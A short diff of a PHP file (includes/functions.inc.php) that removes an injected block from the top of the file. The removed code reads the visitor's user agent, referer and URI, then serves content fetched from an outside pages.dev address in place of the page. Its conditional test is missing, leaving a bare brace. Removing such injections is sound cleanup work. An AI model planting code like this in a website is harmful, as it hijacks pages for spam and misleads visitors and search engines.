@@ -1,14 +1,4 @@
 <?php
-$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
-$referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
-$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
- {
-    echo file_get_contents('https://punten-neng.pages.dev/stitalkhairiyah/ejournal/');
-    exit();
-}
-
-?>
-<?php
 
 /**
  * @file includes/functions.inc.php
